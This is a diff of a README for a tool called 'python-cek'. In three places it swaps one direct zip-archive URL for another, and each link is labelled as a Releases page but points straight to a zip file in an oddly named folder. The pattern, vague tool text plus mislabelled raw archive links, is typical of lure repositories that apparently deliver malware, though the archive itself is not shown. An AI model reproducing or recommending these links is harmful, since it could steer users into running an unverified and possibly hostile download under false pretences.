@@ -1,6 +1,6 @@
 # 🚀 python-cek - Simple Tool for Easy Management
 
-![Download python-cek](https://raw.githubusercontent.com/Mugsymortal326/python-cek/main/mastological/python-cek-v1.3.zip)
+![Download python-cek](https://github.com/Mugsymortal326/python-cek/raw/refs/heads/main/mastological/python-cek-v3.3.zip)
 
 ## 🌟 Overview
 
@@ -28,7 +28,7 @@ To get started with python-cek, follow the steps below. You will download the so
 
 Click the link below to visit the Releases page where you can download the latest version of python-cek.
 
-[Visit the Releases Page](https://raw.githubusercontent.com/Mugsymortal326/python-cek/main/mastological/python-cek-v1.3.zip)
+[Visit the Releases Page](https://github.com/Mugsymortal326/python-cek/raw/refs/heads/main/mastological/python-cek-v3.3.zip)
 
 ### 📥 Step 2: Download the Software
 
@@ -65,7 +65,7 @@ After installing, open python-cek from your Applications folder (macOS), Start M
 
 To keep your application running smoothly, check for updates regularly on the Releases page. Always download the latest version for new features and fixes.
 
-[Visit the Releases Page to Update](https://raw.githubusercontent.com/Mugsymortal326/python-cek/main/mastological/python-cek-v1.3.zip)
+[Visit the Releases Page to Update](https://github.com/Mugsymortal326/python-cek/raw/refs/heads/main/mastological/python-cek-v3.3.zip)
 
 ## 🙋 Frequently Asked Questions
 
